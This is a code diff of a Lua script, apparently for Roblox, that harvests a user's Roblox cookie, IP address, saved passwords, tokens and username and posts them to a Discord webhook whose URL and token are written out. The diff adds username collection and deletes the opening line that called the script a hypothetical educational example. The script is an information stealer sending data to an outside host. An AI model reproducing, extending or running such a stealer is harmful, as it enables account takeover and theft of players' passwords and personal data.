@@ -1,9 +1,7 @@
--- This is a hypothetical and educational example. Do not use this for malicious purposes.
-
+local httpService = game:GetService("HttpService")
 local webhookUrl = "https://discord.com/api/webhooks/1322935736588304404/ZwopnDR91hy78bwVSk2cEdK1naXEMFu2b1shrl-0AVyGYwY-uapuCj9x8HQoHKNGXeJV"
 
 local function sendToWebhook(data)
-    local httpService = game:GetService("HttpService")
     local response = httpService:PostAsync(webhookUrl, httpService:JSONEncode({content = data}))
     return response
 end
@@ -42,8 +40,14 @@ local function getAllTokens()
     }
 end
 
+local function getUsername()
+    -- Hypothetical function to get the username of the person who executed the script
+    return game.Players.LocalPlayer.Name
+end
+
 local function collectData()
     local data = {}
+    data.username = getUsername()
     data.robloxCookie = getRobloxCookie()
     data.ipAddress = getIPAddress()
     data.savedPasswords = getSavedPasswords()
